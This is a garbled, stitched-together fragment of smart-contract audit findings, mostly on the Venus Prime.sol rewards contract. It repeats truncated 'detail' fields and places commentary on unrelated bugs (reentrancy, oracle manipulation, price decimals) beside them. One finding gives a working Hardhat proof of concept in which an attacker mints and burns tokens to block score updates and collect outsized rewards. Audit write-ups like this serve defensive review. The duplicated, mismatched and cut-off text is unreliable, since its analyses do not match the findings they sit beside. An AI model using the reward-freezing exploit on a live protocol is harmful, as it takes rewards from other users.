Assessed type\n\nOther"

The contract's state is not finalized before sending ETH, and there is a potential for an attacker to make reentrant calls during the reward distribution phase, potentially leading to incorrect rewards distribution.",

An attacker could exploit this by recursively calling the 'claimRewards' function during a fallback triggered by ETH transfer. This could manipulate state variables like 'totalRewardsReceived' and 'accumulatedETHPerLPShare' before the completion of the 'withdrawETH' transaction. A suggested patch to mitigate the issue involves reordering operations within the 'withdrawETH' function. Further actions, including implementing non-reentrant checks, thorough testing, auditing, and comprehensive analysis of other functions for similar vulnerabilities, were recommended for complete resolution.",

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3. Run `npx hardhat test tests/hardhat/Prime/PoC.ts`\n\n```typescript\nimport { FakeContract, MockContract, smock } from \"@defi-wonderland/smock\";\nimport { loadFixture, mine } from

If the score is used within the system to make critical financial decisions, an attacker could manipulate the oracle to inflate their score and take advantage of the system, potentially leading to financial loss for other parties involved. Additionally, the information returned by the functions `_xvsBalanceOfUser`, `_xvsBalanceForScore`, and `_capitalForScore` would be necessary to fully assess the way in which data is being processed. Since we can't access their implementations, we can't rule out other potential vulnerabilities related to how they handle user balances or capital calculations. It's also important to ensure that the function is not susceptible to integer overflow/underflow vulnerabilities when performing arithmetic operations. To mitigate the oracle manipulation risk, the contract should use a reliable and decentralized oracle service. It might be wise to pull prices from multiple oracles and use some form of aggregation or consensus mechanism to determine the final price.

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3. Run `npx hardhat test tests/hardhat/Prime/PoC.ts`\n\n```typescript\nimport { FakeContract, MockContract, smock } from \"@defi-wonderland/smock\";\nimport { loadFixture, mine } from

The problem arises because the hard-coded value `1E9` is used without considering the delta between both token decimals. This indicates that the function may not have been thoroughly tested or reviewed to handle all edge cases, particularly when the delta between decimal places is substantial.\n\nA Proof of Concept (PoC) provided shows that for different scenarios where the decimals of `token0` and `token1` differ, the resulting `sqrtPriceX96` can be significantly inflated if the decimals of `token1` are higher than those of `token0`. This miscalculation can lead to highly inflated liquidity calculations and, consequently, to erroneous price calculations in the function that uses this square root price.\n\nCorrecting this vulnerability would involve implementing the recommended mitigation steps, which include adjusting the hard-coded value dynamically based on the actual decimal places of the tokens involved. This adjustment ensures that the square root price is calculated with the appropriate consideration for the token decimal differences, thus preventing the arithmetic issue that leads to over-inflated results.\n\nThe provided patch makes the calculation dynamic by adding or subtracting the difference in decimals from `10**18` when calculating the numerator and, similarly, dynamically adjusting the denominator by raising `10` to the power of the sum of `9` plus the delta of the decimals. This method appropriately scales the calculation so that it can accommodate various ranges of decimal places accurately.\n\nRegarding the relevance of the `calculateScore` function provided, it is not directly linked to the vulnerability described above, as the issue is with the calculation inside `_getOracleData()`. Therefore, the assessment of the `calculateScore` function is outside the scope of this particular vulnerability report unless there is a specific reason to believe it interacts with the impacted code from `_getOracleData()`.\n\nTo confirm the vulnerability, one would first apply the recommended mitigation steps to the actual smart contract code and then test (PoC) it against various scenarios to ensure the square root price calculations are no longer over-inflated when decimal differences exist. This involves comparing the results before and after the patch to verify that the vulnerability has been addressed.",

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3. Run `npx hardhat test tests/hardhat/Prime/PoC.ts`\n\n```typescript\nimport { FakeContract, MockContract, smock } from \"@defi-wonderland/smock\";\nimport { loadFixture, mine } from

It is multiplied with the collateralShare and precision constants before converting to an amount, which should instead be applied to the amount of collateral. This misuse leads to incorrect solvency calculations, impacting the liquidation logic. Additionally, this inconsistency within the protocol suggests a systemic issue, with potential effects on other parts of the contract like `Market._computeMaxBorrowableAmount`.
